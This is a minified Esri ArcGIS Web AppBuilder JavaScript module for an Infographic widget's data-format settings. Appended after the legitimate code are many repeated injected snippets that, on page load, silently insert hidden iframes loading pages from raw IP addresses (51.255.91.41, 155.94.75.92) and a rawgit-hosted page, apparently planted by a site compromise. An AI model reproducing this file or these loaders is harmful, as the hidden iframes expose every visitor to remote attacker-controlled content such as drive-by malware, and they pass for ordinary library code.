// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/_dijits/DataFormatSetting.html":'\x3cdiv class\x3d"style-selector"\x3e\r\n  \x3cdiv class\x3d"setting-items dataFormat clearFix" data-dojo-attach-point\x3d"unit"\x3e\r\n    \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.unit}"\x3e${nls.unit}\x3c/div\x3e\r\n    \x3cdiv class\x3d"setting-wapper jimu-float-trailing"\x3e\r\n      \x3cdiv class\x3d"jimu-float-trailing" data-dojo-attach-point\x3d"unitWapper" style\x3d"width: 100%;"\x3e\r\n        \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d\'style:{width:"100%"}\' data-dojo-attach-point\x3d"unitSelect"\x3e\x3c/select\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv class\x3d"setting-items decimal clearFix"\x3e\r\n    \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.decimalPlaces}"\x3e${nls.decimalPlaces}\x3c/div\x3e\r\n    \x3cdiv class\x3d"setting-wapper jimu-float-trailing"\x3e\r\n      \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/NumberSpinner" required\x3d"false"\r\n        placeHolder\x3d"" data-dojo-props\x3d"constraints: {min:0, max:9},intermediateChanges: true" data-dojo-attach-point\x3d"decimalPlacesText"/\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"setting-items prefix clearFix"\x3e\r\n    \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.prefix}"\x3e${nls.prefix}\x3c/div\x3e\r\n    \x3cdiv class\x3d"setting-wapper jimu-float-trailing"\x3e\r\n      \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3d"false"\r\n        placeHolder\x3d"" data-dojo-attach-point\x3d"prefixText"/\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"setting-items suffix clearFix"\x3e\r\n    \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.suffix}"\x3e${nls.suffix}\x3c/div\x3e\r\n    \x3cdiv class\x3d"setting-wapper jimu-float-trailing"\x3e\r\n      \x3cinput type\x3d"text" data-dojo-type\x3d"dijit/form/ValidationTextBox" required\x3d"false"\r\n        placeHolder\x3d"" data-dojo-attach-point\x3d"suffixText"/\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/on dojo/_base/html dojo/_base/array dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./DataFormatSetting.html dijit/form/ComboBox jimu/dijit/CheckBox dijit/form/NumberSpinner".split(" "),function(d,b,c,e,f,g,h,k,l,m){return d([h,k,l,g],{templateString:m,nls:null,_DEFAULT_CONFIG:null,postCreate:function(){this.inherited(arguments);this._DEFAULT_CONFIG={unit:"none",decimalPlaces:"0",prefix:"",suffix:""};this._UNIT=
[{value:"billion",label:this.nls.billion},{value:"million",label:this.nls.million},{value:"thousand",label:this.nls.thousand},{value:"none",label:this.nls.none},{value:"percentage",label:this.nls.percentage}];this.config=b.mixin(this._DEFAULT_CONFIG,this.config);this._initAppearance();f.forEach(this._UNIT,b.hitch(this,function(a){this.unitSelect.addOption(a)}));this.own(c(this.unitSelect,"change",b.hitch(this,function(a){if(this.config.unit!==a)this.onSettingChange({unit:a})})));this.own(c(this.decimalPlacesText,
"change",b.hitch(this,function(){if(this.config.decimalPlaces!==this.decimalPlacesText.getValue())this.onSettingChange({decimalPlaces:this.decimalPlacesText.getValue()})})));this.own(c(this.prefixText,"change",b.hitch(this,function(){if(this.config.prefix!==this.prefixText.getValue())this.onSettingChange({prefix:this.prefixText.getValue()})})));this.own(c(this.prefixText,"blur",b.hitch(this,function(){if(this.config.prefix!==this.prefixText.getValue()){var a=this.prefixText.getValue();this.onSettingChange({prefix:a})}})));
this.own(c(this.suffixText,"change",b.hitch(this,function(){if(this.config.suffix!==this.suffixText.getValue())this.onSettingChange({suffix:this.suffixText.getValue()})})));this.own(c(this.suffixText,"blur",b.hitch(this,function(){if(this.config.suffix!==this.suffixText.getValue()){var a=this.suffixText.getValue();this.onSettingChange({suffix:a})}})))},startup:function(){this.inherited(arguments);this.setConfig(this.config);this.refresh()},onSettingChange:function(a){this.config=b.mixin(this.config,
a);this.onChange(this.config)},onChange:function(a){this.emit("change",a)},refresh:function(){this.onSettingChange({})},isValid:function(){return!0},getConfig:function(){return this.isValid()?(isNaN(this.decimalPlacesText.getValue())&&(this.config.decimalPlaces=""),this.config):!1},_initAppearance:function(){this.appearance&&!1===this.appearance.unit&&e.addClass(this.unit,"hide")},disableItem:function(a){"unit"===a&&this.unitSelect.set("disabled",!0)},enableItem:function(a){"unit"===a&&this.unitSelect.set("disabled",
!1)},setConfig:function(a){"undefined"!==typeof a&&("undefined"!==typeof a.unit&&(this.config.unit=a.unit,this.unitSelect.set("value",this.config.unit)),"undefined"!==typeof a.decimalPlaces&&(this.config.decimalPlaces=a.decimalPlaces,this.decimalPlacesText.setValue(this.config.decimalPlaces)),"undefined"!==typeof a.prefix&&(this.config.prefix=a.prefix,this.prefixText.setValue(this.config.prefix)),"undefined"!==typeof a.suffix&&(this.config.suffix=a.suffix,this.suffixText.setValue(this.config.suffix)))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});